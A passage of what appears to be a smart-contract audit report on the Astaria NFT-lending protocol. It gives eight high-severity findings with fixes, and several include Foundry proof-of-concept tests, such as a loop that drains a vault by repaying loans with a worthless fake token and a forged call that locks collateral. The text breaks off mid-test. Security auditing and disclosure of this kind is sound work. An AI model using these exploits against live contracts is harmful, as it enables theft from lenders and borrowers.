@@ -1,0 +1,421 @@
+[H-01]LienToken: Lender and liquidator can collude to block auction and seize collateral
+Submitted byhorsefacts, also found bypeakboltandKIntern_NA
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L642-L643
+If a lender offers a loan denominated in an ERC20 token that blocks transfers to certain addresses (for example, the USDT and USDC blocklist), they may collude with a liquidator (or act as the liquidator themselves) to prevent loan payments, block all bids in the liquidation auction, and seize the borrower’s collateral by transferring aLienTokento a blocked address.
+LienTokensact as bearer assets: if a lender transfers their lien token to another address, the lien’s new payee will be theownerOfthe token:
+LienToken#_getPayee
+function_getPayee(LienStoragestorages,uint256lienId)internalviewreturns(address){returns.lienMeta[lienId].payee!=address(0)?s.lienMeta[lienId].payee:ownerOf(lienId);}
+The payee address returned by_getPayeeis used as the recipient address of loan repayments viamakePayment:
+LienToken#_payment
+s.TRANSFER_PROXY.tokenTransferFrom(stack.lien.token,payer,payee,amount);
+…as well as post-liquidation payments from the clearinghouse viapayDebtViaClearingHouse:
+LienToken#_paymentAH
+if(payment>0)s.TRANSFER_PROXY.tokenTransferFrom(token,payer,payee,payment);
+If an adversary tranfers theirLienTokento an address that causes these attempted transfers to revert, like an address on the USDC blocklist, the borrower will be unable to make payments on their lien, the loan will eventually qualify for liquidation, and all bids in the Seaport auction will revert when they attempt to send payment to the blocklisted address.
+Following the failed auction, the liquidator can callCollateralToken#liquidatorNFTClaim, which callsClearingHouse#settleLiquidatorNFTClaimand settles the loan for zero payment, claiming the “liquidated” collateral token for free:
+ClearingHouse#settleLiquidatorNFTClaim
+functionsettleLiquidatorNFTClaim()external{IAstariaRouterASTARIA_ROUTER=IAstariaRouter(_getArgAddress(0));require(msg.sender==address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));ClearingHouseStoragestorages=_getStorage();ASTARIA_ROUTER.LIEN_TOKEN().payDebtViaClearingHouse(address(0),COLLATERAL_ID(),0,s.auctionStack.stack);}
+The lender will lose the amount of their lien, but can seize the borrower’s collateral, worth more than their individual lien. Malicious lenders may offer small loans with attractive terms to lure unsuspecting borrowers. Note also that the lender and liquidator can be one and the same—they don’t need to be different parties to pull off this attack! A clever borrower could potentially perform this attack as well, by acting as borrower, lender, and liquidator, and buying out one of their own liens by using loaned funds.
+(The failed auction liquidation logic above strikes me as a little odd as well: consider whether the liquidator should instead be required to pay a minimum amount covering the bad debt in order to claim the collateral token, rather than claiming it for free).
+Impact
+Malicious lender/liquidator loses amount of their lien, but keeps collateral NFT.Additional liens in the stack cannot be repaid. These other lenders take on bad debt and lose the amount of their liens.Borrower loses their collateral NFT, keeps full amount of their liens.
+Recommendation
+This may be difficult to mitigate. Transferring a lien to a blocklisted address is one mechanism for this attack using USDT and USDC, but there are other ways arbitrary ERC20s might revert. Two potential options:
+Maintain an allowlist of supported ERC20s and limit it to well behaved tokens—WETH, DAI, etc.Do not “push” payments to payees on loan payment or auction settlement, but handle this in two steps—first receiving payment from the borrower or Seaport auction and storing it in escrow, then allowing lien owners to “pull” the escrowed payment.
+Test Case
+See warden’soriginal submissionfor full details.
+SantiagoGregory (Astaria) confirmed
+Picodes (judge) increased the severity to High
+
+[H-02] ERC4626Cloned deposit and mint logic differ on first deposit
+Submitted byadriro, also found byJTs,yongskiws,JC,Josiah,bin2chen,eierina,eierina,Breeje,rbserver,ast3ros, andobront
+https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L129-L133
+TheERC4626Clonedcontract is an implementation of the ERC4626 used for vaults. The standard contains adepositfunction to deposit a specific amount of the underlying asset, and amintfunction that will calculate the amount needed of the underlying token to mint a specific number of shares.
+This calculation is done inpreviewDepositandpreviewMint:
+https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L123-L127
+functionpreviewDeposit(uint256assets)publicviewvirtualreturns(uint256) {returnconvertToShares(assets);}functionconvertToShares(uint256assets)publicviewvirtualreturns(uint256) {uint256supply=totalSupply();// Saves an extra SLOAD if totalSupply is non-zero.returnsupply==0?assets:assets.mulDivDown(supply,totalAssets());}
+https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L129-L133
+functionpreviewMint(uint256shares)publicviewvirtualreturns(uint256) {uint256supply=totalSupply();// Saves an extra SLOAD if totalSupply is non-zero.returnsupply==0?10e18:shares.mulDivUp(totalAssets(),supply);}
+In the case of the first deposit (i.e. whensupply == 0),previewDepositwill return the sameassetsamount for the shares (this is the standard implementation), whilepreviewMintwill simply return10e18.
+Impact
+It seems the intention was to mint a high initial number of shares on first deposit, so an attacker couldn’t mint a low number of shares and manipulate the pool to frontrun an initial depositor.
+However, the protocol has failed to replicate this logic in thedepositfunction, as bothdepositandmintlogic differ (see PoC).
+An attacker can still use thedepositfunction to mint any number of shares.
+Proof of Concept
+contractMockERC20isERC20("Mock ERC20","MERC20",18) {functionmint(addressaccount,uint256amount)external{_mint(account,amount);}}contractTestERC4626isERC4626Cloned{ERC20_asset;constructor() {_asset=newMockERC20();}functionasset()publicoverrideviewreturns(addressassetTokenAddress) {returnaddress(_asset);}functionminDepositAmount()publicoverrideviewreturns(uint256) {return0;}functiontotalAssets()publicoverrideviewreturns(uint256) {return_asset.balanceOf(address(this));}functionsymbol()externaloverrideviewreturns(stringmemory) {return"TEST4626";}functionname()externaloverrideviewreturns(stringmemory) {return"TestERC4626";}functiondecimals()externaloverrideviewreturns(uint8) {return18;}}contractAuditTestisTest{functiontest_ERC4626Cloned_DepositMintDiscrepancy()public{TestERC4626vault=newTestERC4626();MockERC20token=MockERC20(vault.asset());// Amount we deposituint256amount=25e18;// Shares we get if we deposit amountuint256shares=vault.previewDeposit(amount);// Amount needed to mint sharesuint256amountNeeded=vault.previewMint(shares);// The following values should be equal but they notassertFalse(amount==amountNeeded);// An attacker can still mint a single share by using deposit to manipulate the pooltoken.mint(address(this),1);token.approve(address(vault),type(uint256).max);uint256mintedShares=vault.deposit(1,address(this));assertEq(mintedShares,1);}}
+Recommendation
+Thedepositfunction should also implement the same logic as themintfunction for the case of the first depositor.
+androolloyd (Astaria) confirmed
+Picodes (judge) increased severity to High
+
+[H-03] Improper validations in Clearinghouse, possible to lock collateral NFT in contract
+Submitted byLirios, also found byc7e7eff,Koolex,wallstreetvilkas,bin2chen,0xcm,Jeiwan,0xsomeone,synackrst,cergyk,evan,dragotanqueray,HE1M,unforgiven, andladboy233
+When a borrower does not return the borrowed funds on time, a liquidator can trigger a liquidation.In that case the collateral NFT will be listed in an Seaport dutch auction.The auction requests settlementToken and a fake ClearingHouse NFT.When a buyer bids enough of the settlementToken, openSea auction will accept the offer, transfer the NFT from ClearingHouse to bidder, move settlementToken from bidder to ClearingHouse, and ‘transfers’ the fake clearinghouse NFT to clearinghouse. This call toClearingHouse.safeTransferFromtriggers the further processing of the liquidation. It will pay the debt with the funds received from Seaport, and delete data from LienToken and CollateralToken for this collateral NFT.
+The problem is that theClearingHouse.safeTransferFromcan be called by anyone and assumes valid call parameters. One of the parametersidentifieris used to pass the paymentToken address. This can easily be modified to let the contract accept any ERC20 token aspaymentTokento payoff the debt.This allows a malicious actor to lock a user’s collateral NFT and cancel the auction.This could be misused to completely block any liquidatons.
+The steps to reproduce:
+Normal flow: borrow funds via requestLienPositionborrowed funds are not paid back before stack.point.endliquidator calls AstariaRouter.liquidate(…)
+At this time a Seaport auction is initiated and CollateralToken state for this collateralID is updated to be in auction.
+All fine so far.
+An evil actor can now call ClearingHouse.safeTransferFrom with dummy data and a dummy ERC20  token address as paymentToken
+After this call, the Collateral NFT will still be in de ClearingHouse contract, but references to the NFT are cleaned up from both CollateralToken and LienToken.
+This results in the NFT being locked in the contract without any way to get it out.
+Technical details
+When a liquidation is started,_generateValidOrderParametersis called to generate the Seaport order params. It setssettlementToken as the identifierOrCriteria.
+ClearingHouse assumes thatsafeTransferFromwill only be called by Seaport after a succesful auction, and assumes the identifier is thesettlementTokenvalue that was set for the order.The _execute function is called, whichconverts the identifier parameter to a paymentToken addressand checks if the received amount of paymentToken is >= the expected auction currentOfferPrice it accepts the call and moves the token balance to the correct addresses.It then callsLienToken.payDebtViaClearingHouse, passing the fakepaymentTokenas a parameter.Lientoken contract also does not verify if the token is ineed the correct settlementToken and pays off the debt with the fake token balance.It then deletes thecollateralStateHashfor the collateralId, removing the stack state.
+After that,CollateralToken.settleAuctionis called, whichburns the tokenfor collateralId anddeletes idToUnderlyingandcollateralIdToAuctionfor this collateralId.
+We now have a state where the collateral NFT is in the ClearingHouse contract, but all actions are made impossible, because the state in the token contracts are removed.CollateralToken.ownerOf(collateralID)reverts because the entry ins.idToUnderlyingwas removed.This causesreleaseToAddress()andflashAction()to fail.liquidatorNFTClaimfails becauses.collateralIdToAuctionwas cleared.Trying to create a new Lien also fails as that callsCollateralToken.ownerOf(collateralID).
+Proof of concept
+To test the scenario, I have modified the testLiquidationNftTransfer test in AstariaTest.t.sol
+diff --git a/src/test/AstariaTest.t.sol b/src/test/AstariaTest.t.solindex c7ce162..bfaeca6 100644--- a/src/test/AstariaTest.t.sol+++ b/src/test/AstariaTest.t.sol@@ -18,6 +18,7 @@ import "forge-std/Test.sol";import {Authority} from "solmate/auth/Auth.sol";import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";import {MockERC721} from "solmate/test/utils/mocks/MockERC721.sol";+import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";import {MultiRolesAuthority} from "solmate/auth/authorities/MultiRolesAuthority.sol";@@ -1030,8 +1031,19 @@ contract AstariaTest is TestHelpers {uint8(0));vm.stopPrank();-    uint256 bid = 100 ether;-    _bid(Bidder(bidder, bidderPK), listedOrder, bid);++    uint256 collateralId = tokenContract.computeId(tokenId);+    ClearingHouse CH = COLLATERAL_TOKEN.getClearingHouse(collateralId);++    // create a worthless token and send it to the clearinghouse+    MockERC20 worthlessToken = new MockERC20("TestToken","TST",18);+    worthlessToken.mint(address(CH),550 ether);++    // call safeTransferFrom on clearinghouse with the worthless token as paymentToken+    // thiss will trigger the cleaning up after succesful auction+    uint256 tokenAsInt = uint256(uint160(address(worthlessToken)));+    bytes memory emptyBytes;+    CH.safeTransferFrom(address(0),address(bidder),tokenAsInt,0,emptyBytes);// assert the bidder received the NFTassertEq(nft.ownerOf(tokenId), bidder, "Bidder did not receive NFT");
+After this, theassert the bidder received the NFTtest will fail, as the NFT is not moved.
+But the state of the CollateralToken and LienToken contracts is updated.
+Tools Used
+Manual audit, forge
+Recommended Mitigation Steps
+Minimal fix would be to check either check if the supplied paymentToken matches the expected paymentToken, or ignore the parameter alltogether and use the paymentToken from the contract. Other option is to restrict calls to the function to whitelisted addresses (OpenSea controler and conduit ).
+In the current setup, there is no easy way for the ClearingHouse to access information about the settlementToken.It could be added to the AuctionData struct:
+diff --git a/src/interfaces/ILienToken.sol b/src/interfaces/ILienToken.solindex 964caa2..06433c0 100644--- a/src/interfaces/ILienToken.sol+++ b/src/interfaces/ILienToken.sol@@ -238,6 +238,7 @@ interface ILienToken is IERC721 {uint48 startTime;uint48 endTime;address liquidator;+    address settlementToken;AuctionStack[] stack;}
+and then add it in LienToken
+diff --git a/src/LienToken.sol b/src/LienToken.solindex 631ac02..372e197 100644--- a/src/LienToken.sol+++ b/src/LienToken.sol@@ -340,6 +340,8 @@ contract LienToken is ERC721, ILienToken, AuthInitializable {.liquidationInitialAsk.safeCastTo88();auctionData.endAmount = uint88(1000 wei);+    auctionData.settlementToken = stack[0].lien.token;+s.COLLATERAL_TOKEN.getClearingHouse(collateralId).setAuctionData(auctionData);
+In the ClearingHouse it can be used directly, ignoring the supplied parameter:
+diff --git a/src/ClearingHouse.sol b/src/ClearingHouse.solindex 5c2a400..d305ff5 100644--- a/src/ClearingHouse.sol+++ b/src/ClearingHouse.sol@@ -120,7 +120,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0)); // get the router from the immutable argClearingHouseStorage storage s = _getStorage();-    address paymentToken = bytes32(encodedMetaData).fromLast20Bytes();+    address paymentToken = s.auctionStack.settlementToken;uint256 currentOfferPrice = _locateCurrentAmount({startAmount: s.auctionStack.startAmount,
+or used to check the supplied paramameter
+diff --git a/src/ClearingHouse.sol b/src/ClearingHouse.solindex 5c2a400..5a79184 100644--- a/src/ClearingHouse.sol+++ b/src/ClearingHouse.sol@@ -121,6 +121,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {ClearingHouseStorage storage s = _getStorage();address paymentToken = bytes32(encodedMetaData).fromLast20Bytes();+    require(paymentToken == s.auctionStack.settlementToken);uint256 currentOfferPrice = _locateCurrentAmount({startAmount: s.auctionStack.startAmount,
+With this step added, it would still be possible to lock the NFT in the contract, but this time that will only succeed when the requested auction amount is paid. So in that case it would be more logical to simply bid on OpenSea and also get the NFT instead of paying the tokens just to lock it.
+SantiagoGregory (Astaria) confirmed via duplicate issue#564
+
+[H-04] Strategist can fail to withdraw asset token from a private vault
+Submitted byrbserver, also found bym9800,Jeiwan,evan,jesusrod15,Apocalypto, andladboy233
+https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L70-L73
+Calling theAstariaRouter.withdrawfunction calls the followingERC4626RouterBase.withdrawfunction; however, callingERC4626RouterBase.withdrawfunction for a private vault reverts because theVaultcontract does not have anapprovefunction. Directly calling theVault.withdrawfunction for a private vault can also revert since theVaultcontract does not have a way to set the allowance for itself to transfer the asset token, which can cause many ERC20 tokens’transferFromfunction calls to revert when deducting the transfer amount from the allowance. Hence, after depositing some of the asset token in a private vault, the strategist can fail to withdraw this asset token from this private vault and lose this deposit.
+https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52
+functionwithdraw(IERC4626vault,addressto,uint256amount,uint256maxSharesOut)publicpayablevirtualoverridereturns(uint256sharesOut) {ERC20(address(vault)).safeApprove(address(vault),amount);if((sharesOut=vault.withdraw(amount,to,msg.sender)) >maxSharesOut) {revertMaxSharesError();}}
+https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L70-L73
+functionwithdraw(uint256amount)external{require(msg.sender==owner());ERC20(asset()).safeTransferFrom(address(this),msg.sender,amount);}
+Proof of Concept
+Please add the following test insrc\test\AstariaTest.t.sol. This test will pass to demonstrate the described scenario.
+functiontestPrivateVaultStrategistIsUnableToWithdraw()public{uint256amountToLend=50ether;vm.deal(strategistOne,amountToLend);addressprivateVault=_createPrivateVault({strategist:strategistOne,delegate:strategistTwo});vm.startPrank(strategistOne);WETH9.deposit{value:amountToLend}();WETH9.approve(privateVault,amountToLend);// strategistOne deposits 50 ether WETH to privateVaultVault(privateVault).deposit(amountToLend,strategistOne);// calling router's withdraw function for withdrawing assets from privateVault revertsvm.expectRevert(bytes("APPROVE_FAILED"));ASTARIA_ROUTER.withdraw(IERC4626(privateVault),strategistOne,amountToLend,type(uint256).max);// directly withdrawing various asset amounts from privateVault also failsvm.expectRevert(bytes("TRANSFER_FROM_FAILED"));Vault(privateVault).withdraw(amountToLend);vm.expectRevert(bytes("TRANSFER_FROM_FAILED"));Vault(privateVault).withdraw(1);vm.stopPrank();}
+Tools Used
+VSCode
+Recommended Mitigation Steps
+https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L72can be updated to the following code.
+ERC20(asset()).safeTransfer(msg.sender,amount);
+SantiagoGregory (Astaria) confirmed
+
+[H-05] Vault may be drained after a liquidated NFT was claimed by the liquidator
+Submitted byJeiwan, also found byobrontandHE1M
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231
+The owner of a collateral NFT that was liquidated and then claimed by the liquidator (after the auction had no bids) may drain the vault the loan was taken from.
+Proof of Concept
+There’s an extreme situation when a liquidated and auctioned collateral NFT had no bids and the auction has expired. In this situation, the liquidator may claim the NFT by callingCollateralToken.liquidatorNFTClaim. The function:
+callsClearingHouse.settleLiquidatorNFTClaimto burn the lien token associated with the loan and clean up the accounting without repaying the actual loan (the loan cannot be repaid since there were no bids);releases the collateral NFT to the liquidator.
+However, the function doesn’t settle the auction. As a result:
+theCollateralTokenis not burned (CollateralToken.sol#L538);the link between the collateral ID and the underlying token is not removed (CollateralToken.sol#L537);the link between the collateral ID and the auction is also not removed (CollateralToken.sol#L544).
+This allows the owner of the liquidated collateral NFT to create a new lien and take the maximal loan without providing any collateral.
+Exploit Scenario
+Alice deposits an NFT token as a collateral and takes a loan.Alice’s loan expires and her NFT collateral gets liquidated by Bob.The collateral NFT wasn’t sold off auction as there were no bids.Bob claims the collateral NFT and receives it.Alice takes another loan from the vault without providing any collateral.
+The following PoC demonstrates the above scenario:
+// src/test/AstariaTest.t.solfunctiontestAuctionEndNoBidsMismanagement_AUDIT()public{addressbob=address(2);TestNFTnft=newTestNFT(6);uint256tokenId=uint256(5);addresstokenContract=address(nft);// Creating a public vault and providing some liquidity.addresspublicVault=_createPublicVault({strategist:strategistOne,delegate:strategistTwo,epochLength:14days});_lendToVault(Lender({addr:bob,amountToLend:150ether}),publicVault);(,ILienToken.Stack[]memorystack) =_commitToLien({vault:publicVault,strategist:strategistOne,strategistPK:strategistOnePK,tokenContract:tokenContract,tokenId:tokenId,lienDetails:blueChipDetails,amount:100ether,isFirstLien:true});uint256collateralId=tokenContract.computeId(tokenId);vm.warp(block.timestamp+11days);// Liquidator liquidates the loan after expiration.addressliquidator=address(0x123);vm.prank(liquidator);OrderParametersmemorylistedOrder=ASTARIA_ROUTER.liquidate(stack,uint8(0));// Skipping the auction duration and making no bids.skip(4days);// Liquidator claims the liquidated NFT.vm.prank(liquidator);COLLATERAL_TOKEN.liquidatorNFTClaim(listedOrder);PublicVault(publicVault).processEpoch();// Liquidator is the rightful owner of the collateral NFT.assertEq(nft.ownerOf(tokenId),address(liquidator));// Since the auction wasn't fully settled, the CollateralToken still exists for the collateral NFT.// The borrower is the owner of the CollateralToken.assertEq(COLLATERAL_TOKEN.ownerOf(collateralId),address(this));// WETH balances at this moment:// 1. the borrower keep holding the 100 ETH it borrowed earlier;// 2. the vault keeps holding 50 ETH of liquidity.assertEq(WETH9.balanceOf(address(this)),100ether);assertEq(WETH9.balanceOf(address(publicVault)),50ether);// The borrower creates another lien. This time, the borrower is not the owner of the collateral NFT.// However, it's still the owner of the CollateralToken.(,stack) =_commitToLien({vault:publicVault,strategist:strategistOne,strategistPK:strategistOnePK,tokenContract:tokenContract,tokenId:tokenId,lienDetails:blueChipDetails,amount:50ether,isFirstLien:true});// The borrower has taken a loan of 50 ETH from the vault.assertEq(WETH9.balanceOf(address(this)),150ether);// The vault was drained.assertEq(WETH9.balanceOf(address(publicVault)),0ether);}
+Recommended Mitigation Steps
+Consider settling the auction at the end ofsettleLiquidatorNFTClaim:
+diff --git a/src/ClearingHouse.sol b/src/ClearingHouse.solindex 5c2a400..d4ee28d 100644--- a/src/ClearingHouse.sol+++ b/src/ClearingHouse.sol@@ -228,5 +228,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {0,s.auctionStack.stack);+    uint256 collateralId = _getArgUint256(21);+    ASTARIA_ROUTER.COLLATERAL_TOKEN().settleAuction(collateralId);}}
+androolloyd (Astaria) confirmed
+
+[H-06] Buying out corrupts the slope of a vault, reducing rewards of LPs
+Submitted byJeiwan, also found bychaduke,obront,cccz, andrvierdiiev
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L189https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L627-L628
+After a buyout, the slope of a vault won’t be increased. As a result, liquidity providers will lose reward for providing liquidity to borrowers and the borrower will not pay interest for the lien that was bought out.
+Proof of Concept
+Buyout is an important refinancing mechanism that allows borrowers to apply new terms (e.g. changed loan rate and/our duration) to their loans.The implementation of the mechanismallows borrower to repay the owed amount for a lien, burn the lien, and create a new lien. When burning and creating liens it’s important to updatethe slope of a vault: is the total interest accrued by vaults. However, during a buyout the slope of the vault where a new lien is created is not increased:
+after a new lien is created, the slope of the vault is not increased (LienToken.sol#L127);however, the slope of the vault is decreased after the old lien is burned (LienToken.sol#L189,PublicVault.sol#L627-L628)
+Since, during a buyout, a lien with a different interest rate may be created (due to changed loan terms), the slope of the vault must be updated correctly:
+the slope of the previous lien must be reduced from the total slope of the vault;the slope of the new lien must be added to the total slope of the vault.
+If the slope of the new lien is not added to the total slope of the vault, then the lien doesn’t generate interest, which means the borrower doesn’t need to pay interest for taking the loan and liquidity providers won’t be rewarded for providing funds to the borrower.
+The following PoC demonstrates that the slope of a vault is 0 after the only existing lien was bought out:
+// src/test/AstariaTest.t.solfunctiontestBuyoutLienWrongSlope_AUDIT()public{TestNFTnft=newTestNFT(1);addresstokenContract=address(nft);uint256tokenId=uint256(0);uint256initialBalance=WETH9.balanceOf(address(this));// create a PublicVault with a 14-day epochaddresspublicVault=_createPublicVault({strategist:strategistOne,delegate:strategistTwo,epochLength:14days});vm.label(publicVault,"PublicVault");// lend 50 ether to the PublicVault as address(1)_lendToVault(Lender({addr:address(1),amountToLend:50ether}),publicVault);// borrow 10 eth against the dummy NFT(uint256[]memoryliens,ILienToken.Stack[]memorystack) =_commitToLien({vault:publicVault,strategist:strategistOne,strategistPK:strategistOnePK,tokenContract:tokenContract,tokenId:tokenId,lienDetails:standardLienDetails,amount:10ether,isFirstLien:true});// Right after the lien was created the slope of the vault equals to the slope of the lien.assertEq(PublicVault(publicVault).getSlope(),LIEN_TOKEN.calculateSlope(stack[0]));vm.warp(block.timestamp+3days);IAstariaRouter.CommitmentmemoryrefinanceTerms=_generateValidTerms({vault:publicVault,strategist:strategistOne,strategistPK:strategistOnePK,tokenContract:tokenContract,tokenId:tokenId,lienDetails:refinanceLienDetails,amount:10ether,stack:stack});(stack, ) =VaultImplementation(publicVault).buyoutLien(stack,uint8(0),refinanceTerms);// After a buyout the slope of the vault is 0, however it must be equal to the slope of the lien.// Error: a == b not satisfied [uint]//  Expected: 481511019363//  Actual: 0assertEq(PublicVault(publicVault).getSlope(),LIEN_TOKEN.calculateSlope(stack[0]));// A lien exists after the buyout, so the slope of the vault cannot be 0.uint256collId=stack[0].lien.collateralId;assertEq(LIEN_TOKEN.getCollateralState(collId),bytes32(hex"7c2c35af3fb5f00ff3995cdddd95dcbbad96eea7bca39b305f2d0f8a55d838f8"));}
+Recommended Mitigation Steps
+Consider increasing the slope of a public vault after a buyout, similarly to how it’s doneafter a new commitment.
+SantiagoGregory (Astaria) confirmed via duplicate issue#366
+
+[H-07] Malicious refinancing attack could lead to suboptimal NFT liquidation
+Submitted bygtocoder, also found bypeakbolt
+https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L684
+A malicious refinancing with a very lowliquidationInitialAskjust prior to a liquidation event could result in an NFT being liquidated for a price much lower than what the borrower wanted when signing up for the loan. Because refinancing is permission less, anyone can do this close to liquidation event resulting in the user being compensated less than fair price for their NFT.
+Proof of Concept
+Refinance checks are currently permission less, anyone can buyout a lien. This is fine because of the assumption that refinancing leads to a strictly optimal outcome in all cases to the borrower. This is true with respect to the loan duration, interest rate and overall debt parameters. However this is not the case with respect to theliquidationInitialAskloan parameter.
+See code inhttps://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L684refinance checks do not take into accountliquidationInitialAskwhich is one of the loan parameters
+Imagine a user takes a loan for 3 ETH against an NFT with a highliquidationInitialAskof 100 ETH which is a fair value of the NFT to the user. If they are not able to pay off the loan in time, they are assured ~97 ETH back assuming market conditions do not change. However a malicious refinancing done close to liquidation can setliquidationInitialAskclose to 0.
+This is possible because:
+Refinancing is permission lessSince it’s close to liquidation, user has no time to react
+The malicious liquidator just needs to pay off the debt of 3 ETH and a minimal liquidation fee. Further, since they are aware of the initial ask in the NFT auction, they may be able to purchase the NFT for a very low price. The liquidator profits and the initial borrower does not receive a fair market value for their collateral.
+Recommended Mitigation Steps
+Add checks thatliquidationInitialAskdoes not decrease during a refinance. Or set aminimumLiquidationPricewhich is respected across all refinancesDon’t allow refinances close to a liquidation eventDon’t allow loans / refinances less than a minimum duration. May prevent other classes of surprises as well.
+SantiagoGregory (Astaria) confirmed via duplicate issue#470
+
+[H-08] Lack of StrategyDetailsParam.vault validation allows the borrower to steal all the funds from the vault
+Submitted byKoolex, also found bybin2chen
+https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L287
+When a borrower takes a loan, Strategy details are passed along with other required data, and through the overallcommitToLienflow, all the data are validated except the StrategyDetailsParam.vault
+struct StrategyDetailsParam {uint8 version;uint256 deadline;address vault;}
+A borrower then can pass different vault’s address, and when creating a lien this  vault is considered. Later, the borrower makes a payment, it reads the asset from this vault. Thus, the borrower can take loans and repay with whatever token.
+https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L849
+Exploit Scenario
+Allow me to describe a scenario where the borrower can steal all the funds from all vaults that support his/her collateral:
+Bobowns an NFT.Bobsends his NFT to the collateral token contract.Bobcreates his own private vaultBobVaultwith an asset that he createdFakeTokenwhich doesn’t have any value in the market (e.g. just a new ERC20 token).Bobtakes a loan fromVault1(while passingBobVaultin the strategy param).Bobpay the loan with hisFakeTokeninsteadVault1’s asset.Bobthen repeats the steps from point 4 again tillVault1is drained.Bobnow has all the funds fromVault1withzerodebt.Strategisthas the same amount ofVault1’s funds but inFakeToken.
+This exploit can be done with other vaults draining all the funds.To prove this, I’ve coded the scenario below.
+Proof of Concept
+Please create a file with a nameStealAllFundsExploit.t.solundersrc/test/directory.Add the following code to the file.
+pragma solidity =0.8.17;import"forge-std/Test.sol";import {Authority} from"solmate/auth/Auth.sol";import {FixedPointMathLib} from"solmate/utils/FixedPointMathLib.sol";import {MockERC721} from"solmate/test/utils/mocks/MockERC721.sol";import {MultiRolesAuthority} from"solmate/auth/authorities/MultiRolesAuthority.sol";import {ERC721} from"gpl/ERC721.sol";import {SafeCastLib} from"gpl/utils/SafeCastLib.sol";import {IAstariaRouter, AstariaRouter} from"../AstariaRouter.sol";import {VaultImplementation} from"../VaultImplementation.sol";import {PublicVault} from"../PublicVault.sol";import {TransferProxy} from"../TransferProxy.sol";import {WithdrawProxy} from"../WithdrawProxy.sol";import"./TestHelpers.t.sol";import {MockERC20} from"solmate/test/utils/mocks/MockERC20.sol";import {IVaultImplementation} from"../interfaces/IVaultImplementation.sol";contract AstariaTest is TestHelpers {using FixedPointMathLibforuint256;using CollateralLookupforaddress;using SafeCastLibforuint256;ILienToken.Details public lienDetails =ILienToken.Details({maxAmount: 50 ether,rate: (uint256(1e16) * 150) / (365 days),duration: 10 days,maxPotentialDebt: 50 ether,liquidationInitialAsk: 500 ether});function__createPrivateVault(addressstrategist, address delegate,address token)internalreturns (address privateVault){vm.startPrank(strategist);privateVault = ASTARIA_ROUTER.newVault(delegate, token);vm.stopPrank();}functiontestPayWithDifferentAsset()public {TestNFT nft = new TestNFT(2);address tokenContract = address(nft);uint256 initialBalance = WETH9.balanceOf(address(this));// Create a private vault with WETH assetaddress privateVault = __createPrivateVault({strategist: strategistOne,delegate: address(0),token: address(WETH9)});_lendToPrivateVault(Lender({addr: strategistOne, amountToLend: 500 ether}),privateVault);// Send the NFT to Collateral contract and receive Collateral tokenERC721(tokenContract).safeTransferFrom(address(this),address(COLLATERAL_TOKEN),1,"");// generate valid termsuint256 amount = 50 ether; // amount to borrowIAstariaRouter.Commitment memory c = _generateValidTerms({vault: privateVault,strategist: strategistOne,strategistPK: strategistOnePK,tokenContract: tokenContract,tokenId: 1,lienDetails: lienDetails,amount: amount,stack: new ILienToken.Stack[](0)});// Attack starts here// The borrower an asset which has no valueinthe marketMockERC20 FakeToken = new MockERC20("USDC","FakeAsset", 18); // this could be any ERC token created by the attackerFakeToken.mint(address(this),500 ether);// The borrower creates a private vault with his/her assetaddress privateVaultOfBorrower = __createPrivateVault({strategist: address(this),delegate: address(0),token: address(FakeToken)});uint8 i;for( ; i < 10 ; i ++) {// Here is the exploit: commitToLien on privateVaultwhilepassing differentVaultinthe strategyc.lienRequest.strategy.vault = privateVaultOfBorrower;(uint256 lienId, ILienToken.Stack[] memory stack , uint256 payout) = IVaultImplementation(privateVault).commitToLien(c,address(this));console.log("Take 50 ether loan#%d", (i+1));// necessary approvalsFakeToken.approve(address(TRANSFER_PROXY), amount);FakeToken.approve(address(LIEN_TOKEN), amount);// pay the loan with FakeTokenILienToken.Stack[] memory newStack = LIEN_TOKEN.makePayment(stack[0].lien.collateralId,stack,uint8(0),amount);console.log("Repay 50 FakeToken loan#%d", (i+1));}// assertionconsole.log("------");// Vault is drainedconsole.log("PrivateVault Balance: %d WETH", WETH9.balanceOf(privateVault));assertEq(WETH9.balanceOf(privateVault), 0);// The borrower gets 500 etherconsole.log("Borrower Balance: %d WETH", WETH9.balanceOf(address(this)));assertEq(WETH9.balanceOf(address(this)), initialBalance + 500 ether);// strategist receives the fake tokenconsole.log("Strategist Balance: %d FakeToken", 